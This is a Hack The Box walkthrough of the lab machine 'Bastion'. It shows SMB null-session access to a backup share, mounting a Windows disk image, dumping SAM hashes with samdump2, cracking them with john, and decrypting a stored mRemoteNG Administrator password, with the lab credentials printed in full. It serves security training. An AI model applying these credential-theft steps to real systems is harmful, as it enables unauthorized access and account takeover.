---
layout: single
title: Bastion - Hack The Box
excerpt: "We will attack the smb service to clone its content on our attackers machine, we relate a note that is related to a Windows image which we will mount on our system with the qemu utility and then abuse the SYSTEM and SAM configuration files with the samdump2 tool.
To the previously given hash we will break it with john and we will use that password to connect by SSH to the L4mpje user, once inside we will escalate to the Administrator user relating the SSH service with mRemoteNG, which we will exploit with a public github script to gain administrator access."
date: 2021-09-02
classes: wide
header:
  teaser: /assets/images/htb-writeup-bastion/bastion_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - Windows
  - Smb
  - Mount vhd
  - SYSTEM SAM files
  - samdump2
  - mRemoteNG
---

# Description

We will attack the smb service to clone its content on our attackers machine, we relate a note that is related to a Windows image which we will mount on our system with the qemu utility and then abuse the SYSTEM and SAM configuration files with the samdump2 tool.
To the previously given hash we will break it with john and we will use that password to connect by SSH to the L4mpje user, once inside we will escalate to the Administrator user relating the SSH service with mRemoteNG, which we will exploit with a public github script. 

![](/assets/images/htb-writeup-bastion/bastion-statics.png)

# Recognition Phase

It is a windows machine, so we directly launch a TCP Syn Port Scan because port scanning on Windows computers is usually much slower than on Linux computers.

```
$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.180 -oG allPorts

PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
```

We launch a few basic scripts of enumeration and detection of version and services.

```
$ nmap -sC -sV -p22,135,139,445,49664,49665,49669 10.10.10.134 -oN targeted

# Nmap 7.91 scan initiated Thu Sep  2 22:45:50 2021 as: nmap -sC -sV -p22,135,139,445,49664,49665,49669 -oN targeted 10.10.10.134
Nmap scan report for 10.10.10.134
Host is up (0.17s latency).

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -36m37s, deviation: 1h09m15s, median: 3m21s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-02T22:50:15+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-02T20:50:16
|_  start_date: 2021-09-02T20:44:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep  2 22:47:03 2021 -- 1 IP address (1 host up) scanned in 72.57 seconds
```

## Port analysis

- Port 22: The ssh version is not related to any critical vulnerability that could be useful.
- Ports 135, 49664, 49665, 49669: msrpc
- Ports 139, 445: smb service.

Considering that there is no http service exposed and the ssh version is not related to any critical vulnerability, we only have to execute the intrusion from the msrpc or smb services, in this case smb is the most delicate vector, so let's start there.
<br> 

### To attack through the smb service, we can start by listing the shared resources as follows.

```
$ smbclient -L 10.10.10.134 -N          

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

- -L to list shared resources.
- N to confirm that we are going to connect to the service with a null session, since we have no password. If we do not specify this parameter it will ask us for a password and we would have to put an empty one, basically the -N parameter saves us a step.

The only shared resource that we can connect to with a null session is the one that does not have the "$" character. 
We connect to the resource Backups and we see that it contains inside.

```
$ smbclient //10.10.10.134/Backups -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 16 12:02:11 2019
  ..                                  D        0  Tue Apr 16 12:02:11 2019
  note.txt                           AR      116  Tue Apr 16 12:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 13:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 13:44:02 2019

		7735807 blocks of size 4096. 2761330 blocks available
```

At this point we could bring the files to our team of attackers with the command get note.txt for example. But to work in a more comfortable way we are going to create a mount with the resources that are shared by smb.

To do the mount without problems, we must first make sure we have the following package installed: ````apt-get install cifs-utils```.

```
$ mkdir /mnt/smb

$ mount -t cifs //10.10.10.134/Backups /mnt/smb
Password for root@//10.10.10.134/Backups: 

$ ls -la /mnt/smb 
drwxr-xr-x root root 4.0 KB Tue Apr 16 12:02:11 2019 .
drwxr-xr-x root root  26 B  Fri Sep  3 21:15:26 2021 ..
drwxr-xr-x root root   0 B  Fri Feb 22 13:44:02 2019 WindowsImageBackup
.r-xr-xr-x root root 116 B  Tue Apr 16 12:10:09 2019 note.txt
.rwxr-xr-x root root   0 B  Fri Feb 22 13:43:08 2019 SDT65CB.tmp
```

## Viewing the shared files.

```
$ cat note.txt

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

The WindowsImageBackup folder seems to be related to the above note, let's see what it contains.

```
$ cd WindowsImageBackup                

$ ls
L4mpje-PC

$ cd L4mpje-PC         

$ ls
Backup 2019-02-22 124351  Catalog  SPPMetadataCache  MediaId

$ cd Backup\ 2019-02-22\ 124351 

$ ll
.rwxr-xr-x root root  36 MB Fri Feb 22 13:44:03 2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
.rwxr-xr-x root root 5.0 GB Fri Feb 22 13:45:32 2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
.rwxr-xr-x root root 1.2 KB Fri Feb 22 13:45:32 2019 BackupSpecs.xml
.rwxr-xr-x root root 1.1 KB Fri Feb 22 13:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
.rwxr-xr-x root root 8.7 KB Fri Feb 22 13:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
.rwxr-xr-x root root 6.4 KB Fri Feb 22 13:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
.rwxr-xr-x root root 2.8 KB Fri Feb 22 13:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
.rwxr-xr-x root root 1.5 KB Fri Feb 22 13:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
.rwxr-xr-x root root 1.4 KB Fri Feb 22 13:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
.rwxr-xr-x root root 3.8 KB Fri Feb 22 13:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
.rwxr-xr-x root root 3.9 KB Fri Feb 22 13:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
.rwxr-xr-x root root 6.9 KB Fri Feb 22 13:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
.rwxr-xr-x root root 2.3 MB Fri Feb 22 13:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
```

We encounter files with extension .vhd (Virtual Hard Disk) is a file format that represents a virtual hard disk drive. It is typically used as a hard disk of a virtual machine.

And with .xml files, which is a plain text file that uses a series of custom tags in order to describe both the structure and other characteristics of the document.

<br>
We see that the file 9b9cfbc4-369e-11e9-a17c-806e6f6e6e6963.vhd weighs 5GB, to enumerate it and to discard that there are interesting things what we are going to do is to mount it.

To start with the mount the first thing we must do is to have the following tool installed ````apt install qemu-utils -y````



Then with rmmod we load the nbd kernel module.

```
$ modprobe nbd

$ rmmod nbd

$ qemu-nbd -c /dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd

$ mkdir /mnt/Bastion

$ mount /dev/nbd0p1 /mnt/Bastion

$ cd /mnt/Bastion

$ ls -la                
drwxrwxrwx root root   0 B  Fri Feb 22 13:39:26 2019 $Recycle.Bin
drwxrwxrwx root root  12 KB Fri Feb 22 13:39:17 2019 .
drwxr-xr-x root root  40 B  Fri Sep  3 21:49:19 2021 ..
lrwxrwxrwx root root  18 B  Tue Jul 14 06:53:55 2009 Documents and Settings ⇒ /mnt/Bastion/Users
drwxrwxrwx root root   0 B  Tue Jul 14 04:37:05 2009 PerfLogs
drwxrwxrwx root root 4.0 KB Tue Apr 12 04:21:18 2011 Program Files
drwxrwxrwx root root 4.0 KB Tue Jul 14 06:53:55 2009 ProgramData
drwxrwxrwx root root   0 B  Fri Feb 22 13:39:17 2019 Recovery
drwxrwxrwx root root 4.0 KB Fri Feb 22 13:43:53 2019 System Volume Information
drwxrwxrwx root root 4.0 KB Fri Feb 22 13:39:21 2019 Users
drwxrwxrwx root root  16 KB Fri Feb 22 13:40:48 2019 Windows
.rwxrwxrwx root root  24 B  Wed Jun 10 23:42:20 2009 autoexec.bat
.rwxrwxrwx root root  10 B  Wed Jun 10 23:42:20 2009 config.sys
.rwxrwxrwx root root 2.0 GB Fri Feb 22 13:38:21 2019 pagefile.sys
```

Sometimes when using ```modprobe nbd``` I got an error when using the command ```qemu-nbd -c /dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6f6e6963.vhd```, if you get the error I recommend that when using ```modprobe nbd``` you indicate ```modprobe nbd max_part=16```.

We see that the image that we mount is a Windows directory structure, listing quickly the users and their directories there is nothing interesting that can help us. Since we have the image mounted on our computer, otherwise if we were on the victim computer already connected as a user it is likely that we do not have the capacity to access the directory.
Then something interesting is to check if we can see the files of the path \Windows\System32\config 

<br>
```
$ cd Windows/System32/config                                

$ ll
drwxrwxrwx root root   0 B  Tue Jul 14 04:04:23 2009 Journal
drwxrwxrwx root root   0 B  Fri Feb 22 13:37:28 2019 RegBack
drwxrwxrwx root root 4.0 KB Sat Nov 20 21:48:09 2010 systemprofile
drwxrwxrwx root root 4.0 KB Fri Feb 22 13:38:05 2019 TxR
.rwxrwxrwx root root  28 KB Fri Feb 22 22:37:05 2019 BCD-Template
.rwxrwxrwx root root  25 KB Fri Feb 22 22:37:05 2019 BCD-Template.LOG
.rwxrwxrwx root root  30 MB Fri Feb 22 13:43:54 2019 COMPONENTS
.rwxrwxrwx root root 1.0 KB Tue Apr 12 04:23:54 2011 COMPONENTS.LOG
.rwxrwxrwx root root 256 KB Fri Feb 22 13:43:54 2019 COMPONENTS.LOG1
.rwxrwxrwx root root   0 B  Tue Jul 14 04:03:40 2009 COMPONENTS.LOG2
.rwxrwxrwx root root 1.0 MB Fri Feb 22 13:38:46 2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.0.regtrans-ms
.rwxrwxrwx root root 1.0 MB Fri Feb 22 13:38:46 2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.1.regtrans-ms
.rwxrwxrwx root root 1.0 MB Fri Feb 22 13:38:46 2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.2.regtrans-ms
.rwxrwxrwx root root  64 KB Fri Feb 22 13:38:46 2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.blf
.rwxrwxrwx root root  64 KB Fri Feb 22 13:38:21 2019 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TM.blf
.rwxrwxrwx root root 512 KB Fri Feb 22 13:38:21 2019 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms
.rwxrwxrwx root root 512 KB Tue Jul 14 06:46:45 2009 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms
.rwxrwxrwx root root 256 KB Fri Feb 22 13:43:54 2019 DEFAULT
.rwxrwxrwx root root 1.0 KB Tue Apr 12 04:23:51 2011 DEFAULT.LOG
.rwxrwxrwx root root  89 KB Fri Feb 22 13:43:54 2019 DEFAULT.LOG1
.rwxrwxrwx root root   0 B  Tue Jul 14 04:03:40 2009 DEFAULT.LOG2
.rwxrwxrwx root root 256 KB Fri Feb 22 13:39:21 2019 SAM
.rwxrwxrwx root root 1.0 KB Tue Apr 12 04:23:51 2011 SAM.LOG
.rwxrwxrwx root root  21 KB Fri Feb 22 13:39:21 2019 SAM.LOG1
.rwxrwxrwx root root   0 B  Tue Jul 14 04:03:40 2009 SAM.LOG2
.rwxrwxrwx root root 256 KB Fri Feb 22 13:43:54 2019 SECURITY
.rwxrwxrwx root root 1.0 KB Tue Apr 12 04:23:51 2011 SECURITY.LOG
.rwxrwxrwx root root  21 KB Fri Feb 22 13:43:54 2019 SECURITY.LOG1
.rwxrwxrwx root root   0 B  Tue Jul 14 04:03:40 2009 SECURITY.LOG2
.rwxrwxrwx root root  23 MB Fri Feb 22 13:43:54 2019 SOFTWARE
.rwxrwxrwx root root 1.0 KB Tue Apr 12 04:23:54 2011 SOFTWARE.LOG
.rwxrwxrwx root root 256 KB Fri Feb 22 13:43:54 2019 SOFTWARE.LOG1
.rwxrwxrwx root root   0 B  Tue Jul 14 04:03:40 2009 SOFTWARE.LOG2
.rwxrwxrwx root root 9.3 MB Fri Feb 22 13:43:54 2019 SYSTEM
.rwxrwxrwx root root 1.0 KB Tue Apr 12 04:23:51 2011 SYSTEM.LOG
.rwxrwxrwx root root 256 KB Fri Feb 22 13:43:54 2019 SYSTEM.LOG1
.rwxrwxrwx root root   0 B  Tue Jul 14 04:03:40 2009 SYSTEM.LOG2
```

The SAM and SYSTEM file exists.

The SAM file is a Security Account Manager (SAM) is a database stored as a registry file in Windows NT, Windows 2000, and later versions of Microsoft Windows. It stores user passwords in a hashed (secure, encrypted) format. The SYSTEM file is used to protect the SAM file, it holds the key to decrypt the contents of the SAM file.

To dump the hashes of the passwords possibly stored in these files we can use the samdump2 tool.

```
$ samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

First we have to pass as argument the SYSTEM file and then SAM.

The first 2 users are disabled, let's see if we can break the NTLM hash of user L4mpje with john.

```
$ john --format=NT --wordlist=rockyou.txt NTLM-hash 
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
No password hashes left to crack (see FAQ)

$ john --show --format=NT NTLM-hash                
*disabled* Administrator::500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:bureaulampje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::

3 password hashes cracked, 0 left
```

The password of the user L4mpje is bureaulampje, let's see if we can use it to connect via SSH.

```
$ ssh L4mpje@10.10.10.134
```


```
Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

l4mpje@BASTION C:\Users\L4mpje>whoami                                                                                           
bastion\l4mpje                                                                                                                  

l4mpje@BASTION C:\Users\L4mpje>
```
<br>
# Privilege Escalation

## L4mpje to Administrator

We enumerate the system and in Program Files (x86) we see mRemoteNG

```
l4mpje@BASTION C:\PROGRA~2>dir                                                                                                  
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 0CB3-C487                                                                                              

 Directory of C:\PROGRA~2                                                                                                       

22-02-2019  15:01    <DIR>          .                                                                                           
22-02-2019  15:01    <DIR>          ..                                                                                          
16-07-2016  15:23    <DIR>          Common Files                                                                                
23-02-2019  10:38    <DIR>          Internet Explorer                                                                           
16-07-2016  15:23    <DIR>          Microsoft.NET                                                                               
22-02-2019  15:01    <DIR>          mRemoteNG                                                                                   
23-02-2019  11:22    <DIR>          Windows Defender                                                                            
23-02-2019  10:38    <DIR>          Windows Mail                                                                                
23-02-2019  11:22    <DIR>          Windows Media Player                                                                        
16-07-2016  15:23    <DIR>          Windows Multimedia Platform                                                                 
16-07-2016  15:23    <DIR>          Windows NT                                                                                  
23-02-2019  11:22    <DIR>          Windows Photo Viewer                                                                        
16-07-2016  15:23    <DIR>          Windows Portable Devices                                                                    
16-07-2016  15:23    <DIR>          WindowsPowerShell
```

The SSH service in Windows is rare, to save enumeration steps one of the first things we can do in these cases is to go directly to mRemoteNG when we see that the windows machine has SSH, it is something I have seen in other cases.

To exploit mRemoteNG we have to go to %appdata%/mRemoteNG and we will see the following files.

```
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir                                                                    
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 0CB3-C487                                                                                              

 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG                                                                         

22-02-2019  15:03    <DIR>          .                                                                                           
22-02-2019  15:03    <DIR>          ..                                                                                          
22-02-2019  15:03             6.316 confCons.xml                                                                                
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                                     
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                                     
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                                     
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                                     
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                                     
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                                     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                                     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                                     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                                     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                                     
22-02-2019  15:03                51 extApps.xml                                                                                 
22-02-2019  15:03             5.217 mRemoteNG.log                                                                               
22-02-2019  15:03             2.245 pnlLayout.xml                                                                               
22-02-2019  15:01    <DIR>          Themes
```

The file we are interested in is the confCons.xml file. 

```
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir                                                                    
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 0CB3-C487                                                                                              

 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG                                                                         

22-02-2019  15:03    <DIR>          .                                                                                           
22-02-2019  15:03    <DIR>          ..                                                                                          
22-02-2019  15:03             6.316 confCons.xml                                                                                
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                                     
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                                     
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                                     
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                                     
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                                     
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                                     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                                     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                                     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                                     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                                     
22-02-2019  15:03                51 extApps.xml                                                                                 
22-02-2019  15:03             5.217 mRemoteNG.log                                                                               
22-02-2019  15:03             2.245 pnlLayout.xml                                                                               
22-02-2019  15:01    <DIR>          Themes      
```

```
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml                                                      

<?xml version="1.0" encoding="utf-8"?>                                                                                          
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GC
M" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0
oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">                                                                                      
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Userna
me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
 Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rend
eringEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeo
ut="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" Disp
layThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" R
edirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" Redire
ctKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEn
coding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPa
ssword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostna
me="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="
false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnab
leFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" I
nheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false"
 InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" Inhe
ritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleS
ession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="fa
lse" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoad
BalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" Inheri
tExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" 
InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNC
Colors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHo
stname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false
" InheritRDGatewayDomain="false" />                                                                                             
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128"
 Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostnam
e="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rendering
Engine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="f
alse" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayTh
emes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" Redire
ctPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKey
s="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncodin
g="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPasswor
d="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname=""
 RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false
" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFon
tSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" Inheri
tPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" Inhe
ritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRe
directSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSessio
n="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" 
InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalan
ceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtA
pp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" Inher
itVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColor
s="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostnam
e="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" Inh
eritRDGatewayDomain="false" />                                                                                                  
</mrng:Connections>                           
```

We pass the contents of the file to our team of attackers and search the file for the passwords it stores. To make it faster I just copy and paste it to my computer and with the grep utility it finds the passwords quickly.

```
$ cat confCons.xml | grep -i "password"

me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
me="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="
```

There is the password ```Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="```, now we should look for a script to break it, this [repository](https://github.com/haseebT/mRemoteNG-Decrypt) has a good one.

Create another file containing only the password hash and run the script.

```
$ python3 mremoteng_decrypt.py -f hash 
Password: thXLHM96BeKL0ER2
```

We connect to the administrator user via SSH.

```
$ Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

administrator@BASTION C:\Users\Administrator>whoami                                                                             
bastion\administrator
```
